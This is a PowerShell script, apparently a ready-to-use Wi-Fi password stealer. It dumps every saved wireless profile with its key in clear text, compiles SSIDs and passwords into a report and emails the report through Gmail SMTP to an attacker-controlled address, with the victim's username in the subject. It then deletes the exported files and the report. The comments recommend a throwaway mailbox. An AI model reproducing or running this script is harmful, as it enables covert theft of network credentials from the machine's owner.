netsh wlan export profile key=clear

echo "Wifi Password Extractor Coded By Exploitech & Wazanator" > wifipass.txt
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial + "`r`n AUTH = " +$xml.WLANProfile.MSM.Security.authEncryption.authentication + "`r`n ENCRYPT = " +$xml.WLANProfile.MSM.Security.authEncryption.encryption + "`r`n"

Out-File wifipass.txt -Append -InputObject $a

}
netsh wlan show drivers | Add-Content -Path .\wifipass.txt
# Note: You need to enable "Lesse Secure App Access" https://myaccount.google.com/security
# The Gmail account in question should probably be a throw away
$Username = "GmailUserName"
$Password = "GmailPassword"
$path = $PSScriptRoot+"\wifipass.txt"

$message = new-object Net.Mail.MailMessage;
$message.From = $Username
$message.To.Add($Username);
$message.Subject = "WIFI Password Report For " + $env:UserName;
$message.IsBodyHtml = $true
$message.Body = "See attached report for Wi-Fi Passwords and SSID";
$attachment = New-Object Net.Mail.Attachment($path);
$message.Attachments.Add($attachment);

$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
$smtp.EnableSsl = $true;
$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
$smtp.send($message)
$attachment.Dispose();

Remove-Item * -Include *.xml -Force
Remove-Item .\wifipass.txt -Force
